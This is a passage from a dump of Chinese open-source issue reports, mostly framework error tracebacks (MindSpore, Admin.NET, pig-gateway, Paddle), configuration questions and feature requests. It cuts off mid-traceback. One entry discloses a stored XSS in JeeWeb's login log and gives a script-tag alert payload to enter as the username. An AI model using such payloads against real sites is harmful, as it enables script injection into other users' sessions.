obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E AttributeError: List [Int64*6] object has no attribute: shape E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/cpm/whl/n1008/OpsTester/operations/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/loss/loss.py:2318 E if len(log_probs.shape) == 2: E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/pipeline/jit/static_analysis/prim.cc:1636 GetEvaluatedValueForBuiltinTypeAttrOrMethod /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/common/api.py:1337: AttributeError self = CTCLossNet&lt;&gt;, log_probs = (-5, -3, -1, 1, 3, 5), targets = (-5, -3, -1, 1, 3, 5), input_lengths = (-5, -3, -1, 1, 3, 5) target_lengths = (-5, -3, -1, 1, 3, 5) def construct(self, log_probs, targets, input_lengths, target_lengths): &gt; if len(log_probs.shape) == 2: E AttributeError: 'tuple' object has no attribute 'shape' /root/archiconda3/envs/cpm_high/lib/python3.7/site-packages/mindspore/nn/loss/loss.py:2318: AttributeError"
使用post请求时，body里面发现中文乱码，Content-type 为 application/json;charset=utf-8，求大佬帮忙指点,"使用post请求时，body里面发现中文乱码，Content-type 为 application/json;charset=utf-8，求大佬帮忙指点   <code>: @Request( url = ""${""+ForestApiConstant.GOODS_PUSH_KEY+""}?token=${token}"", type = ""post"", charset = ""utf-8"", headers ={ ""Accept-Charset: utf-8"", ""Content-Type:application/json;charset=utf-8"" }, contentEncoding = ""utf-8"" )"
三级动态表头 只有一行数据时 数据没有显示,"版本号： 积木报表是一款免费报表产品，功能免费源码不开放;   <code>: 1.4.2 描述： 三级动态表头时，后端数据是单行数据 此时数据丢失 数据如下： {""data"":[{""name"":""张三"",""t1"":""张家口"",""value"":""90"",""t2"":""第一中学"",""t3"":""数学""},{""name"":""张三"",""t1"":""张家口"",""value"":""80"",""t2"":""第一中学"",""t3"":""语文""}]} 补充：t1,t2,t3为动态表头 name为行级分组 动态字段为 value 问题：没有vlue值"
admin.net template 切换mysql,"getorgtree接口报错 【消息】Executed DbCommand (3ms) [Parameters=[@p0='superAdmin' (Size = 20), @p1='MySqlConnector.Core.ServerSession+d__86' (Size = 100), @p2='You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'longtext) AS , . AS FROM AS WHERE ((' at line 1' (Size = 4000), @p3='You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'longtext) AS , . AS FROM AS WHERE ((' at line 1' (Size = 4000), @p4='MySqlConnector' (Size = 4000), @p5='2021-05-17T15:16:25.4180157+08:00', @p6='MoveNext' (Size = 100), @p7='超级管理员' (Size = 100), @p8='System.Reflection.ParameterInfo[]' (Size = 4000), @p9=' at MySqlConnector.Core.ServerSession.ReceiveReplyAsyncAwaited(ValueTask2 cachedProcedures, IMySqlCommand command, CommandBehavior behavior, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlDataReader.cs:line 444 at MySqlConnector.Core.CommandExecutor.ExecuteReaderAsync(IReadOnlyList1.AsyncEnumerator.InitializeReaderAsync(DbContext _, Boolean result, CancellationToken cancellationToken) at Pomelo.EntityFrameworkCore.MySql.Storage.Internal.MySqlExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func4 verifySucceeded, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable1 source, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.EntityFrameworkQueryableExtensions.ToListAsync[TSource](IQueryable`1 source, CancellationToken cancellationToken) at Admin.NET.Core.Service.SysOrgService.GetOrgTree() at lambda_method820(Closure , Object ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Logged|12_1(ControllerActionInvoker invoker) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)' (Size = 4000), @p10=NULL (DbType = Guid)], CommandType='""Text""', CommandTimeout='30']   <code>: Value s Sort Weight sys_org s s Value s Sort Weight sys_org s s 1 task) in /_/src/MySqlConnector/Core/ServerSession.cs:line 877 at MySqlConnector.Core.ResultSet.ReadResultSetHeaderAsync(IOBehavior ioBehavior) in /_/src/MySqlConnector/Core/ResultSet.cs:line 50 at MySqlConnector.MySqlDataReader.ActivateResultSet(CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlDataReader.cs:line 119 at MySqlConnector.MySqlDataReader.CreateAsync(CommandListPosition commandListPosition, ICommandPayloadCreator payloadCreator, IDictionary 1 commands, ICommandPayloadCreator payloadCreator, CommandBehavior behavior, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/Core/CommandExecutor.cs:line 60 at MySqlConnector.MySqlCommand.ExecuteReaderAsync(CommandBehavior behavior, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlCommand.cs:line 315 at MySqlConnector.MySqlCommand.ExecuteDbDataReaderAsync(CommandBehavior behavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlCommand.cs:line 307 at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable 4 operation, Func 1.AsyncEnumerator.MoveNextAsync() at Microsoft.EntityFrameworkCore.EntityFrameworkQueryableExtensions.ToListAsync[TSource](IQueryable"
pig-gateway中使用openfeign报错,"pig版本:pig v3.0.3 是否修改包名: 否 在pig-gateway的filter中使用openfeign   <code>: pig-gateway | 2021-01-21 11:31:51.236 ERROR 1 --- [or-http-epoll-2] reactor.netty.http.server.HttpServer : [id: 0xabc40847, L:/172.21.0.7:9999 - R:/49.67.232.216:46247] pig-gateway | pig-gateway | java.lang.AbstractMethodError: org.springframework.cloud.netflix.ribbon.RibbonLoadBalancerClient.choose(Ljava/lang/String;Lorg/springframework/cloud/client/loadbalancer/Request;)Lorg/springframework/cloud/client/ServiceInstance; pig-gateway | at org.springframework.cloud.openfeign.loadbalancer.FeignBlockingLoadBalancerClient.execute(FeignBlockingLoadBalancerClient.java:88) pig-gateway | at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119) pig-gateway | at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89) pig-gateway | at com.pig4cloud.pig.common.feign.ext.PigSentinelInvocationHandler.invoke(PigSentinelInvocationHandler.java:116) pig-gateway | at com.sun.proxy.$Proxy161.user(Unknown Source)"
 支持特定接口可配置独立的序列化规范化配置,"在过去，接口只能应用全局的规范化或者特定接口不启用规范化处理，但随着业务需求越来越复杂，对接的第三方越来越多，那么就需要多套自定义规范化结果的机制。 相关资料 #I38L9B:如何设置某一个接口响应数据不自动转小写，按原始字段名返回。 #I51WLX:关于规范返回结果，能否改为AOP形式在过滤器上实现 #I5FII8:支持多套规范化结果功能 功能清单 支持特别接口自定义规范化序列化配置选项 支持特别接口应用全新的一套规范化处理 编写更新日志内容 期望效果 注册可添加多套规范化配置 在类或方法中使用 配置 的序列化 测试案例 !571: 支持特定接口可配置独立的序列化规范化配置   <code>: // 替换默认的 services.AddUnifyProvider&lt;SpeciallyResultProvider&gt;(); // 添加更多规范化配置 services.AddUnifyProvider&lt;SpeciallyResultProvider&gt;(""unique_name""); [UnifyProvider] // 默认的（不贴也是默认的） public class FurionAppService: IDynamicApiController { } [UnifyProvider(""specially"")] // 自定义的 public class FurionAppService: IDynamicApiController { } [UnifyProvider] // 默认的 public class FurionAppService: IDynamicApiController { [UnifyProvider(""specially"")] // 复写默认的 public string GetName() { } } JsonResult public IActionResult OnSucceeded(ActionExecutedContext context, object data) { return new JsonResult(RESTfulResult(StatusCodes.Status200OK, true, data), new JsonSerializerOptions { ... }); } services.AddUnifyProvider&lt;SpeciallyResultProvider&gt;(""specially""); [UnifyModel(typeof(MyResult&lt;&gt;))] public class SpeciallyResultProvider : IUnifyResultProvider { public IActionResult OnException(ExceptionContext context, ExceptionMetadata metadata) { return new ContentResult() { Content = ""异常啦"" }; } public IActionResult OnSucceeded(ActionExecutedContext context, object data) { return new ContentResult() { Content = ""成功啦"" }; } public IActionResult OnValidateFailed(ActionExecutingContext context, ValidationMetadata metadata) { return new ContentResult() { Content = ""失败啦"" }; } public async Task OnResponseStatusCodes(HttpContext context, int statusCode, UnifyResultSettingsOptions unifyResultSettings) { await Task.CompletedTask; } } public class MyResult&lt;T&gt; { /// &lt;summary&gt; /// 数据 /// &lt;/summary&gt; public T Data { get; set; } } public class TestUnifyProvider : IDynamicApiController { public string DefaultUnify() { return ""test""; } [UnifyProvider] public string DefaultUnify2() { return ""test""; } [UnifyProvider(""specially"")] public string SpeciallyUnify() { return ""特别""; } }"
JeeWeb login log has a front-end storage XSS vulnerability,"Vulnerability Analysis and Testing I. When the user logs in, fill in the XSS payload at the user name   <code>: &lt;script&gt;alert(/xss/)&lt;/script&gt;"
网络train/eval模式异常,"Paddle版本2.0.0b0，一个网络train/eval模式的改变会影响其他网络 demo代码输出False, False，期望为True, False   <code>: 0 import paddle 1 import paddle.nn as nn 2 3 class Net1(nn.Layer): 4 def __init__(self): 5 super(Net1, self).__init__() 6 self.linear = nn.Linear(2, 3) 7 8 def forward(self, x): 9 return self.linear(x) 10 11 class Net2(nn.Layer): 12 def __init__(self): 13 super(Net2, self).__init__() 14 self.linear = nn.Linear(2, 3) 15 16 def forward(self, x): 17 return self.linear(x) 18 19 paddle.disable_static() 20 net1 = Net1() 21 net1.eval() 22 net2 = Net2() 23 net2.train() 24 to_float = lambda x: paddle.to_tensor(x, dtype='float32') 25 print(net1(to_float([[1,2]])).stop_gradient) 26 print(net2(to_float([[1,2]])).stop_gradient)"
CAPI embedding layer forward core dumped,"在使用paddle的capi进行预测时，执行一个embedding layer的forward函数时出core。 core信息如上所示，这里的Check错误是什么导致的呢，麻烦解答一下，方便定位问题。   <code>: F1013 15:20:06.695574 13589 TableProjection.cpp:39] Check failed: in_-&gt;ids *** Check failure stack trace: *** Thread [140573139056384] Forwarding emb_tbu, *** Aborted at 1507879206 (unix time) try ""date -d @1507879206"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x1f700003185) received by PID 12677 (TID 0x7fd9bc04b700) from PID 12677; stack trace: *** @ 0x7fdcd4005160 (unknown) @ 0x7fdcc9e5e3f7 __GI_raise @ 0x7fdcc9e5f7d8 __GI_abort Aborted (core dumped)"
NumberUtil.isPrimes求质数方法有缺陷，容易出现BUG,使用的JDK版本和Hutool版本 1.8 ， 4.1.19 求质数的这个方法是可以的，但是 它有缺陷， 参数是 int 类型，可是并没有对其进行校验， 比如如果是 负数 比如 -1 ，或者是 1 那么它返回的是true，也就是 它是一个质数？ 这样子很容易在使用的过程中造成 BUG，因为 要程序员自己保证输入的参数 是大于 1的整数。   <code>: System.out.println(NumberUtil.isPrimes(1)); // 结果为 true
activity-timeout设置参数导致不能登录问题,"使用版本: v1.30.0 使用satoken+jwt的形式 application.yml 只要activity-timeout设置的不是-1就会报错。 访问的是登录接口   <code>: { ""timestamp"": ""2022-06-26T15:18:38.232+0000"", ""status"": 500, ""error"": ""Internal Server Error"", ""message"": ""this api is disabled"", ""path"": ""/acc/login"" } &lt;dependency&gt; &lt;groupId&gt;cn.dev33&lt;/groupId&gt; &lt;artifactId&gt;sa-token-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.dev33&lt;/groupId&gt; &lt;artifactId&gt;sa-token-jwt&lt;/artifactId&gt; &lt;/dependency&gt; sa-token: token-prefix: Bearer # jwt秘钥 jwt-secret-key: asdasdasifhueuiwyurfewbfjsdafjk # token名称 (同时也是cookie名称) token-name: Authorization # token有效期，单位s 默认30天, -1代表永不过期 timeout: 2592000 # token临时有效期 (指定时间内无操作就视为token过期) 单位: 秒 activity-timeout: 600 # 是否允许同一账号并发登录 (为true时允许一起登录, 为false时新登录挤掉旧登录) is-concurrent: true # 在多人登录同一账号时，是否共用一个token (为true时所有登录共用一个token, 为false时每次登录新建一个token) is-share: false # 是否输出操作日志 is-log: false @RequestMapping(""login"") public SaTokenInfo login() { StpUtil.login(10002); SaTokenInfo tokenInfo = StpUtil.getTokenInfo(); return tokenInfo; }"
【重庆大学众智】pointpillars模型npu下运行报错segmentation fault以及算计编译失败,"运行环境 Ascend -- MindSpore version : Mindspore 1.5.0 -- Python version : Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : 错误描述 segmentation fault + single op compile failed 项目代码 https://gitee.com/jessonguo/pointpillars-mindspore   <code>: [WARNING] MD(2179,7fe7a27fc700,python):2021-11-15-11:00:16.542.972 [mindspore/ccsrc/minddata/dataset/engine/datasetops/source/generator_op.cc:183] operator()] Bad performance attention, it takes more than 25 seconds to generator.__next__ new row, which might cause `GetNext` timeout problem when sink_mode=True. You can increase the parameter num_parallel_workers in GeneratorDataset / optimize the efficiency of obtaining samples in the user-defined generator function. [WARNING] DEVICE(2179,7fe71aff1700,python):2021-11-15-11:00:45.964.750 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] Node:[Tile] reduce precision from int64 to int32 [WARNING] DEVICE(2179,7fe71aff1700,python):2021-11-15-11:00:46.223.953 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] Node:[Tile] reduce precision from int64 to int32 [WARNING] DEVICE(2179,7fe71aff1700,python):2021-11-15-11:00:46.361.841 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] Node:[Tile] reduce precision from int64 to int32 [WARNING] DEVICE(2179,7fe71aff1700,python):2021-11-15-11:00:47.082.523 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] Node:[ScatterNdUpdate] reduce precision from int64 to int32 [WARNING] DEVICE(2179,7fe71aff1700,python):2021-11-15-11:00:47.082.594 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] Node:[ScatterNdUpdate] reduce precision from int64 to int32 [WARNING] PRE_ACT(2179,7fe71aff1700,python):2021-11-15-11:00:47.084.720 [mindspore/ccsrc/backend/optimizer/ascend/format_type/deal_ref_and_split_unsupported_transdata.cc:110] AddAdditionalToRefOutput] ref op origin node is not parameter Fatal Python error: Segmentation fault Current thread 0x00007f26f07e8740 (most recent call first): File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/_ffi/_ctypes/function.py"", line 208 in __call__ File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 220 in _static_lower_phase_3 File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 284 in cce_base_static_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 536 in cce_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 70 in wrapper File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 991 in build_cce File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/build_module.py"", line 804 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 397 in build_schedules_impl File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 414 in build_schedules File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_build_.py"", line 172 in build_cce File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/debug/decorators.py"", line 247 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/api/tik_build.py"", line 424 in BuildCCE File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/tik/tik_lib/tik_source_info.py"", line 44 in wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/utils/scatter/scatter.py"", line 831 in scatter_operator File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/scatter_nd_update.py"", line 57 in scatter_nd_update File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 539 in _in_wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259 in call_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1271 in build_single_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1471 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1278 in loop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 218 in exec_compilation_task File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 99 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 297 in _bootstrap File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/spawn.py"", line 118 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 297 in _serve_one File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 261 in main File ""&lt;string&gt;"", line 1 in &lt;module&gt; Fatal Python error: Segmentation fault Current thread 0x00007f26f07e8740 (most recent call first): File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/_ffi/_ctypes/function.py"", line 208 in __call__ File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 181 in _static_lower_phase_1 File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 281 in cce_base_static_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 536 in cce_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 70 in wrapper File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 991 in build_cce File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/build_module.py"", line 804 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1413 in _build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1478 in cce_build_code File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/unify_schedule/build.py"", line 42 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/api.py"", line 1006 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/lang/cce/api.py"", line 1284 in cce_build_code File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/tile_d.py"", line 360 in tile_d File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 539 in _in_wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259 in call_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1271 in build_single_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1471 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1278 in loop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 218 in exec_compilation_task File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 99 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 297 in _bootstrap File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/spawn.py"", line 118 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 297 in _serve_one File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 261 in main File ""&lt;string&gt;"", line 1 in &lt;module&gt; Fatal Python error: Segmentation fault Current thread 0x00007f26f07e8740 (most recent call first): File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/_ffi/_ctypes/function.py"", line 208 in __call__ File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 290 in cce_base_static_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 536 in cce_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 70 in wrapper File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 991 in build_cce File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/build_module.py"", line 804 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1413 in _build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1478 in cce_build_code File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/unify_schedule/build.py"", line 42 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/api.py"", line 1006 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/lang/cce/api.py"", line 1284 in cce_build_code File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/cast.py"", line 383 in cast File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 539 in _in_wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259 in call_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1271 in build_single_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1471 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1278 in loop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 218 in exec_compilation_task File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 99 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 297 in _bootstrap File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/spawn.py"", line 118 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 297 in _serve_one File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 261 in main File ""&lt;string&gt;"", line 1 in &lt;module&gt; SystemError: null argument to internal routine Fatal Python error: Segmentation fault Current thread 0x00007f26f07e8740 (most recent call first): File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/_ffi/_ctypes/function.py"", line 208 in __call__ File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 220 in _static_lower_phase_3 File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 284 in cce_base_static_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 536 in cce_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 70 in wrapper File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 991 in build_cce File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/build_module.py"", line 804 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1413 in _build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/static_schedule/cce_schedule.py"", line 1478 in cce_build_code File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/unify_schedule/build.py"", line 42 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/dsl/api.py"", line 1006 in build File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te/lang/cce/api.py"", line 1284 in cce_build_code File ""/usr/local/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/truncate_div.py"", line 129 in truncate_div File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 539 in _in_wrapper File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1259 in call_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1271 in build_single_op File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1471 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1278 in loop File ""/root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 218 in exec_compilation_task File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 99 in run File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/process.py"", line 297 in _bootstrap File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/spawn.py"", line 118 in _main File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 297 in _serve_one File ""/root/miniconda3/envs/ci3.7/lib/python3.7/multiprocessing/forkserver.py"", line 261 in main File ""&lt;string&gt;"", line 1 in &lt;module&gt; Fatal Python error: Segmentation fault Current thread 0x00007f26f07e8740 (most recent call first): File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/_ffi/_ctypes/function.py"", line 208 in __call__ File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 220 in _static_lower_phase_3 File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 284 in cce_base_static_lower File ""/disk1/miniconda3/envs/ci3.7/lib/python3.7/site-packages/tbe/tvm/cce_build_module.py"", line 